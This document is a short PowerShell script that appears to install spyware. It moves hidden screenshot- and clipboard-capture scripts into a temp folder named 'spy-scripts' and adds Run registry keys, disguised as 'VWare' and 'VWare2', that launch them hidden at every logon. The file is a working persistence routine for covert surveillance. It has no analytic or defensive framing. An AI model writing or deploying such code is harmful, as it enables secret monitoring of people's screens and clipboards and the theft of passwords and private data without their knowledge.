$registryPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
New-Item -Path "$env:TEMP\spy-scripts" -ItemType Directory -Force
New-Item -Path "$env:TEMP\Collection" -ItemType Directory -Force
Move-Item -Path ".\.screenshots.ps1" "$env:TEMP\spy-scripts\"
Move-Item -Path ".\.clipboard.ps1" "$env:TEMP\spy-scripts\"
New-ItemProperty -Path $registryPath -Name "VWare" -Value "powershell.exe -WindowStyle Hidden -File '$env:TEMP\spy-scripts\.screenshots.ps1'" -PropertyType String -Force
New-ItemProperty -Path $registryPath -Name "VWare2" -Value "powershell.exe -WindowStyle Hidden -File '$env:TEMP\spy-scripts\.clipboard.ps1'" -PropertyType String -Force
